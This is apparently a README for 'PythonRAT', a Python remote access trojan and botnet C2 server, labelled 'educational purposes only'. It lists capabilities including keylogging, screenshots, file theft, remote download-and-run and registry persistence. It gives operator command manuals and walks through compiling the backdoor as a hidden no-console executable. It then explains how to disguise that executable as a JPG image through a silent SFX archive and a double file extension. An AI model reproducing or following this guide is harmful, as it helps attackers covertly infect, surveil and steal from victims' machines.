# PythonRAT

**The MALWARE _PythonRAT_ is for EDUCATIONAL PURPOSES ONLY!!** 

**Description**

PythonRAT is a Command and Control (C2) server which can control multiple machines running the Remote Administration Trojan (RAT) forming a botnet cluster which was written in Python3. 


# Features

- Integrated keylogger written as a class
   * Can be started and stopped remotely
   * With options to _dump_ or _overwrite_ the log file
- Check privilege level (Administrator/User)
- Spawn other programs
- Download files from target
- Download files from specified URL
- Upload files to target
- C2 allows control of multiple target sessions
- Issue a _sendall *command*_ to every active session
- Persistence by creating a registry entry (Windows)
- Conceals infection by writing files in AppData (Windows)

- Screenshot of the target's screen which is sent to server
- Remote shutdown of the backdoor _(executable is NOT safely removed)_


## Table of Contents  
- [Usage Manuals](#usage-manuals)
  * [C2 Manual](#c2-manual)
  * [Session Manual](#session-manual)
- [Wine and Pyinstaller (Win version) Installation on Linux](#wine-and-pyinstaller--win-version--installation-on-linux)
  * [Environment Setup](#environment-setup)
  * [Installing Dependencies](#installing-dependencies)
- [Backdoor Compilation and Obfuscation for Windows](#backdoor-compilation-and-obfuscation-for-windows)
  * [Compile to Executable using Pyinstaller Linux](#compile-to-executable-using-pyinstaller-linux)
  * [Compile to Executable using Pyinstaller (Win) under Wine](#compile-to-executable-using-pyinstaller--win--under-wine)
  * [Obfuscation using SFX Archive (Theory)](#obfuscation-using-sfx-archive--theory-)
    + [NOTE: SFX Archive](#note--sfx-archive)
  * [Creating SFX Archive](#creating-sfx-archive)
  * [Creating SFX Archive - Visual](#creating-sfx-archive---visual)
  * [Task Manager](#task-manager)
- [Preview Images](#preview-images)
  * [Target Connection to C2 Server](#target-Connection-to-c2-server)
  * [Interacting with Session](#interacting-with-session)
  * [Test Commands on Target](#test-commands-on-target)
  * [Session Options](#session-options)
  * [Backgrounding and Killing Session](#backgrounding-and-killing-session)


# Usage Manuals
## C2 Manual

    targets                 --> Prints Active Sessions
    session *session num*   --> Will Connect To Session (background to return)
    clear                   --> Clear Terminal Screen
    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
    kill *session num*      --> Issue 'quit' To Specified Target Session
    sendall *command*       --> Sends The *command* To ALL Active Sessions (sendall notepad)



## Session Manual

    quit                                --> Quit Session With The Target
    clear                               --> Clear The Screen
    background                          --> Send Session With Target To Background
    cd *Directory name*                 --> Changes Directory On Target System
    upload *file name*                  --> Upload File To The Target Machine From Working Dir 
    download *file name*                --> Download File From Target Machine
    get *url*                           --> Download File From Specified URL to Target ./
    keylog_start                        --> Start The Keylogger
    keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
    keylog_stop                         --> Stop And Self Destruct Keylogger File
    screenshot                          --> Takes screenshot and sends to server ./screenshots/
    start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
    remove_backdoor                     --> Removes backdoor from target!!!
    
    ===Windows Only===
    persistence *RegName* *filename*    --> Create Persistence In Registry
                                            copies backdoor to ~/AppData/Roaming/filename
                                            example: persistence Backdoor windows32.exe
    check                               --> Check If Has Administrator Privileges

# Wine and Pyinstaller (Win version) Installation on Linux

Python 2.7.14 Releases: https://www.python.org/downloads/release/python-2714/

## Environment Setup

┌──(root💀kali)-[~/]

└─# 
    sudo su
    
    dpkg --add-architecture i386
    apt update
    apt install wine32 
    wget https://www.python.org/ftp/python/2.7.14/python-2.7.14.msi
    sudo wine msiexec -i ~/python-2.7.14.msi #x86 arch
    
    
## Installing Dependencies

┌──(root💀kali)-[~/.wine/drive_c]

└─# 

    cd /root/.wine/drive_c/Python27
    wine python.exe -m pip install  pyinstaller
                                    requests
                                    pyautogui
				    pynput


# Backdoor Compilation and Obfuscation for Windows

## Compile to Executable using Pyinstaller Linux

    $ pyinstaller --onefile --noconsole backdoor.py

or,

## Compile to Executable using Pyinstaller (Win) under Wine

    # wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole ~/backdoor.py
    
**alternatively** if an _icon_ has already been created,
    
    # wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --icon ~/malware_128x128.ico ~/backdoor.py
    
This will produce _./dist/backdoor.exe_


## Obfuscation using SFX Archive (Theory)

The executable _backdoor.exe_ will be made to look like an image (jpg) file.
By default, Windows does not show file extensions (e.g. backdoor.exe will show in Windows Explorer as backdoor).
Hence, we will create an SFX archive name _wallpaper.jpg.exe_ which Windows Explorer will show as _wallpaper.jpg_.

This will involve having an _image_ which we will also create an icon version of _.ico_ to assign the SFX archive.
Making the executable appear to be an image.

Of course, this same method could be applied to audio, document or video file using an appropriate icon.

### NOTE: SFX Archive

SFX archive is not the only method of obfuscating the executable.
We can when compiling using _Pyinstaller_ add the argument _--add-data "/root/wallpaper.jpg;."_ with
_--icon ~/wallpaper.ico_.

    # wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --add-data "/root/wallpaper.jpg;." --icon ~/malware_128x128.ico ~/backdoor.py
    # mv ./dist/_backdoor.exe_ ./dist/_wallpaper.jpg.exe_


## Creating SFX Archive

WinRAR > Add To Archive (image.jpg and backdoor.exe)

Rename archive to: _image.jpg.exe_


-Add to SFX Archive (Y) and Advanced>

    **Setup>Run after extraction**
    
		California-HD-Background.jpg
		backdoor.exe

	**Modes**
		Unpack to temporary folder
		Silent mode
			Hide all

	**Update**
		Update mode>
			Extract and update files
		Overwrite mode>
			Overwrite all files
			
	**Text and icon**
		Load SFX icon from the file (image ICO)



## Creating SFX Archive - Visual

https://user-images.githubusercontent.com/10171446/153578069-851d3896-67d0-465b-ad92-267ad21504ee.mp4


This will produce an SFX archive which looks like an image

While inspecting the file will reveal it is an executable the file extension _.exe_ is concealed.
Furthermore, if viewed from the Desktop the file cannot be differentiated from a 'real' image.

![image8](https://user-images.githubusercontent.com/10171446/153618884-601e9a7f-9bda-4fd5-a5a0-9808053160c5.PNG)



Once opened the SFX archive will open the image file inside the archive and the malware will execute after.

Due to _--noconsole_ argument in _Pyinstaller_, no window will be rendered.


## Task Manager

The _backdoor.exe_ process can be seen in Task Manager and ended there if necessary.

# Preview Images

## Target Connection to C2 Server

![Screenshot_2022-02-10_06-16-22](https://user-images.githubusercontent.com/10171446/153403206-4ce3dc23-4c1a-41b6-a715-2e2021d965ce.png)


## Interacting with Session

![Screenshot_2022-02-10_06-17-20](https://user-images.githubusercontent.com/10171446/153403283-3df77fd8-2cbe-4990-b82f-d847bdde3bee.png)


## Test Commands on Target

![Screenshot_2022-02-10_06-22-48](https://user-images.githubusercontent.com/10171446/153403427-058ebe8a-36d8-465c-8386-7a55cea1641b.png)


## Session Options

![Screenshot_2022-02-10_06-23-21](https://user-images.githubusercontent.com/10171446/153403579-3b090b00-2dec-4c33-a94d-020eb2b0d2b4.png)


## Backgrounding and Killing Session

![Screenshot_2022-02-10_06-25-04](https://user-images.githubusercontent.com/10171446/153403973-d9757c68-4ca2-405f-ae13-a0ca0666bfcc.png)

